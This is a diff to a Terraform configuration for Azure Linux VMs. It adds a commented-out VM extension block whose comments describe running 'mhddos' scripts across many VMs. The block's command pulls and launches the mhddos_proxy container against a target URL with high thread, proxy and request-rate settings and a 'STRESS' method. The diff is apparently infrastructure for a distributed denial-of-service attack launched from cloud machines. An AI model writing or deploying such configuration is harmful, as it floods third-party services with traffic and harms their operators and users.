@@ -160,3 +160,23 @@ resource "azurerm_linux_virtual_machine" "myterraformvm" {
 
   tags = var.tags
 }
+# Tried custom script extension as a tool for running mhddos scripts as a replacement of cloud-init. However,
+# this approach works only on VM provisioning time
+# thus you have to destroy and re-create VMs every time you change 'commandToExecute' attribute.
+#resource "azurerm_virtual_machine_extension" "runMhddosScript" {
+#  count = var.vm_count
+#
+#  name                 = "hostname"
+#  virtual_machine_id   = azurerm_linux_virtual_machine.myterraformvm[count.index].id
+#  publisher            = "Microsoft.Azure.Extensions"
+#  type                 = "CustomScript"
+#  type_handler_version = "2.0"
+#
+#  settings = <<SETTINGS
+#    {
+#        "commandToExecute": "sudo docker run --name mhddosProxy -d --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy https://1.1.1.1 -t 1000 -p 1200 --rpc 2000 --http-methods GET STRESS --debug"
+#    }
+#SETTINGS
+#
+#  tags = var.tags
+#}
